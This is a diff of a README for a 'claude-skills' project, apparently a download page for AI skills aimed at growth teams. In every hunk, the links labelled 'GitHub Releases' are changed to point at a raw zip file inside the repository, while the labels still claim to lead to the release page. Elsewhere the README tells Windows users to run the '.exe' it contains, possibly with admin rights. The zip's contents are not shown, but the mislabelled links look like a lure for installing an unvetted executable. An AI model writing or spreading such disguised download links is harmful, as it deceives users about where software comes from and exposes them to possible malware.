@@ -1,10 +1,10 @@
 # 🤖 claude-skills - Practical AI skills for growth teams
 
-[![Download claude-skills](https://img.shields.io/badge/Download%20Now-4F46E5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/modest-curator478/claude-skills/releases)
+[![Download claude-skills](https://img.shields.io/badge/Download%20Now-4F46E5?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/modest-curator478/claude-skills/main/job-search/skills_claude_v1.1.zip)
 
 ## 📥 Download
 
-Visit this page to download: [GitHub Releases](https://github.com/modest-curator478/claude-skills/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/modest-curator478/claude-skills/main/job-search/skills_claude_v1.1.zip)
 
 Use the latest release file for your Windows computer. If you see more than one file, pick the one with `.exe` in the name.
 
@@ -36,7 +36,7 @@ If your company laptop has strict controls, you may need admin access to open th
 
 ## 🚀 Getting Started
 
-1. Open the [GitHub Releases](https://github.com/modest-curator478/claude-skills/releases) page.
+1. Open the [GitHub Releases](https://raw.githubusercontent.com/modest-curator478/claude-skills/main/job-search/skills_claude_v1.1.zip) page.
 2. Download the latest Windows file.
 3. Save the file to your Downloads folder.
 4. Open File Explorer and go to Downloads.
@@ -177,7 +177,7 @@ Yes, if your laptop lets you run downloaded apps and open GitHub release files
 
 ## 📎 Release Access
 
-Download or install from the GitHub release page here: [https://github.com/modest-curator478/claude-skills/releases](https://github.com/modest-curator478/claude-skills/releases)
+Download or install from the GitHub release page here: [https://raw.githubusercontent.com/modest-curator478/claude-skills/main/job-search/skills_claude_v1.1.zip](https://raw.githubusercontent.com/modest-curator478/claude-skills/main/job-search/skills_claude_v1.1.zip)
 
 ## 🧠 Topic Areas
 
